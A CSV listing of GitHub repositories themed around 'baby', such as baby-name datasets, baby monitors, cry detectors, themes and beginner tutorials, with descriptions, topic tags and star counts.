,Url,Description,Topics,Stars
84,https://github.com/JonnyBanana/QuickUACk.git,:baby_chick:   Some of my antiUAC Scripts for Rubbber Ducky    :baby_chick: ,"rubber-ducky,rubber-ducky-script,uac,uac-bypass,disable-uac,user-account-control,windows-exploitation",21
85,https://github.com/BastianPoe/owlet_api.git,Unofficial Python API for the Owlet Smart Baby Monitor ,,21
86,https://github.com/davidleininger/cobaltnext-vscode.git,If Oceanic Next and Cobalt2 made a baby in the form of a theme for VSCode.,"vscode,vscode-theme",21
87,https://github.com/AlexeyMK/markov-baby-names.git,Baby Name Generator using a simple Markov Chain.,,20
88,https://github.com/stechstudio/laravel-record.git,"{""What if Laravel's Collection and Model classes had a baby?""}","laravel,collections,model",20
89,https://github.com/rubyforgood/babywearing.git,A lending library for Babywearing communities that manages baby carrier inventory and memberships,,19
90,https://github.com/ThinkR-open/prenoms.git,French Baby Names 1900-2019,"r,dataset",19
91,https://github.com/Swizec/react-d3js-ebook.git,"This is a baby project, things will show up soon.",,19
92,https://github.com/upamune/esa.vim.git,:baby_chick: vimscript for esa.io :baby_chick:,,19
93,https://github.com/martimatix/sweet-sweet-friction.git,A Gimme Friction Baby clone written in Elm language,,19
94,https://github.com/TutorialsByNick/blog-operating-system.git,This is the operating system for http://tutorialsbynick.com/writing-an-os-baby-steps/. Feel free to clone and follow along!,,19
95,https://github.com/Brackets-Themes/80sBaby.git,"{""80's Baby Theme for Brackets. A Brackets original.""}",,18
96,https://github.com/guydavis/babynamemap.git,A Rails mashup with Google Maps of popular baby name statistics from around the world.,,18
97,https://github.com/panacloud/learn-progressive-web-apps.git,Learn to build Progressive Web Apps in Baby Steps,,17
98,https://github.com/fahad19/cakephp-bower.git,:baby_chick: CakePHP Plugin for Twitter Bower,,17
99,https://github.com/tonietto/Elementary-OS-First-Steps.git,:baby_bottle: First steps for configuring a fresh installed eOS,"zsh,terminal,ubuntu,elementary-os,linux,hyper",17
100,https://github.com/akashgiricse/django-for-newborn-babies.git,"{""Of course not for newborn babies 👶  A Django (Python's web framework) guide for those who are not sure where to start.""}","django,guide,guideline,python3,django-framework,django-guide",17
101,https://github.com/lukehsiao/CribSense.git,":camera: A contactless, video-based baby monitor that uses video magnification","raspberry-pi,baby,monitor,video-magnification",17
102,https://github.com/panacloud/learn-typed-react.git,Learn to develop single page web apps (SPAs) in baby steps using React 0.14 and TypeScript 1.6+,,17
103,https://github.com/laander/trello-birdseye.git,:baby_chick: Chrome Extension for minimalistic board/card styling giving you a birds-eye view in Trello,,17
104,https://github.com/Marcus-L/m4rcus.HatchBaby.Rest.git,Control Hatch Baby Rest devices using Bluetooth LE,,17
105,https://github.com/simonswiss/react-baby-names.git,A ReactJS app to find inspiration for baby names.,,16
106,https://github.com/babydots/babydots.git,Sensory app for young babies,"baby,android,sensory",16
107,https://github.com/sparkfun/SparkFun_ToF_Range_Finder-VL6180_Arduino_Library.git,VL6180 Baby Bear time of flight range finder Library for use with SparkFun breakouts ,,16
108,https://github.com/rougier/baby-gnu-tux.git,3D files for printing baby GNU and Tux,,16
109,https://github.com/openrain/bootstrap.git,BOOTSTRAP SCRIPTS BABY!,,15
110,https://github.com/navjotts/baby-cry-detector.git,Uses DL techniques to detect whether a baby is crying,,15
111,https://github.com/Troy-Wang/BabyCryDetector.git,A baby cry detector written with matlab and  a classifier based on sklearn.,"audio,scikit-learn,matlab,c,python",15
112,https://github.com/drnic/babygopher-site.git,Landing page for getting yourself the Baby Gopher badge for your first Golang projects,,15
113,https://github.com/QuackFuzed/cfUniForm.git,A CFML custom tag library written by Matt Quackenbush and built around the Uni-Form markup specification (authored by Dragan Babic).,,15
114,https://github.com/baguette/rs-babygc.git,"A port of Bob Nystrom\'s ""Baby\'s First Garbage Collector"" to Rust",,15
115,https://github.com/aruljohn/popular-baby-names.git,"1, 000 most popular names for baby boys and girls in CSV and JSON formats. Generator written in Python.","boys,girls,csv,json,dataset,python,python3",14
116,https://github.com/Fallen-Breath/mc-198678-fix.git,Stop baby piglin dooping,,14
117,https://github.com/gphat/babyvm.git,"{""Baby's First Garbage Collector""}",,14
118,https://github.com/kissrobber/Automatic-Baby-Bouncer.git,Baby sitting automation by Arduino,,14
119,https://github.com/hugmanrique/PokeData.git,":baby_chick: Pokémon data structure classes from Gen III (Ruby, Sapphire, Emerald, FireRed & LeafGreen)","pokemon,data-structures,rom-hacking,gba",14
120,https://github.com/yakupyazar/SoundApplication.git,"Ad-free, open source baby sleeper sounds app.",,13
121,https://github.com/panacloud/learn-ios9-hybrid-apps.git,Learn to develop iOS 9 Hybrid Apps in Baby Steps. Swift and JavaScript/TypeScript are a match made in heaven. ,,13
122,https://github.com/vavjeeva/PiMonitR.git,Real Time Baby Monitor Chrome Extension - Streaming from Raspberry PI using SignalR and Cognitive Vision Service,,13
123,https://github.com/jasonzurita/BabyPatterns.git,Tracking and review of baby feedings (iOS).,,13
124,https://github.com/gonzofish/ng2-webpack-bare.git,"A bare-bones Angular 2/Webpack configuration. Nothing fancy, just you and Webpack making an Angular 2 baby.",,13
125,https://github.com/sonyagreen/baby-legs.git,Knitted baby legwarmers,,12
126,https://github.com/netguru/baby-monitor-client-android.git,Internal Baby Monitor android project,,12
127,https://github.com/mine-cetinkaya-rundel/ukbabynames.git,UK Baby Names Data,"r-package,data,opendata,uk",12
128,https://github.com/ferlatte/babytools.git,Documentation of things that have been good baby tools.,,12
129,https://github.com/HudsonHuang/Baby-Crying-Detect.git,"{""Using Spectrum Energy Matching algorithms to detect baby's crying. Running on ARM9 demoboard and the performance is not bad.""}","voice-recognition,cpp,embedded,embedded-systems",12
130,https://github.com/kkdai/LineBotBabyLuis.git,"A baby NLU chatbot using LUIS, Chinese website https://www.evanlin.com/go-luis-linebot/","luis,chatbot,nlu-chatbot",12
131,https://github.com/numo-labs/aws-lambda-canary.git,:baby_chick: Canary project for lambda services on AWS,,12
132,https://github.com/PaulKinlan/baby-log.git,A simple logger of baby related events. Feed. Sleep. Poop....,,12
133,https://github.com/DeveloperPaul123/rayray.git,Rayray is a baby ray tracer written in C++.,"cpp,cpp11,cpp17,graphics,raytracer,raytracing,raytracing-engine,raytracing-one-weekend,c-plus-plus,stl,standard-template-library",12
134,https://github.com/yashbonde/dall-e-baby.git,When Dall E was a baby trained on a bit of data,,12
135,https://github.com/iupui-soic/mHBS_trainer.git,The Mobile Helping Babies Breathe apps,"mhealth,community-health,e-learning,educational-technology,neonatal",11
136,https://github.com/junhaideng/Google-visit-helper.git,google访问助手:baby_chick:,"chrome,google",11
137,https://github.com/Prooffreader/Baby_names_US_IPython.git,A set of IPython notebooks to help analyze the US Social Security Administration baby names database,,11
138,https://github.com/layumi/matlab_email_demo.git,a easy solution for baby sitting program!!! (MATLAB),matlab,11
139,https://github.com/pamelafox/baby-type-n-play.git,"{""Baby Type'N'Play: let your baby smash your keyboard and only cause minimal chaos!""}",,11
140,https://github.com/mineur/twitter-stream-api.git,:baby_chick: Another Twitter stream PHP library to retrieve filtered tweets on hot.,"twitter-streaming-api,php71,guzzle,streaming-data,streaming-api,mineur",11
141,https://github.com/aspiers/zkp-eddsa-point-doubler.git,"Zero Knowledge proof for point doubling on baby JubJub elliptic curve, using Zokrates",,11
142,https://github.com/yumi0629/flutter_baby_name.git,An application to help your baby to choose his/her name by himself/herself.,,11
